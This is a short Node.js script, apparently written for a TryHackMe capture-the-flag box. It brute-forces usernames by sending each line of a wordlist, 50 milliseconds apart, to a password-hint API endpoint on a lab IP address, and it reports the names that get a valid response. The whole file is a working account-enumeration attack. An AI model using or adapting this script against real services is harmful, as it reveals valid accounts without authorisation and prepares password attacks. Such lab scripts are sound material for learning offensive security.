const fs = require('fs'); // Reading the wordlist
const got = require('got'); // Reading the passwordhint page

let options = {
    hostname: '10.10.251.49',
    port: 80,
    path: `/api/user/passwordhint/test`,
    method: 'GET',
}; 

fs.readFileSync('/root/boxes/THM_Hacker_Note/wordlist.txt', 'utf-8')
.split(/\r?\n/)
.forEach((line, i) => {
    setTimeout(() => {
        let user = line.replace(/\s/g, '%20')
        let url = `http://10.10.251.49/api/user/passwordhint/${user}`; // Passwordhint url
        got(url).then((res) => {
            let content = JSON.parse(res.body);
            console.log(`Right! ${line}`);
        }).catch((err) => {
        })
    }, i * 50);
});
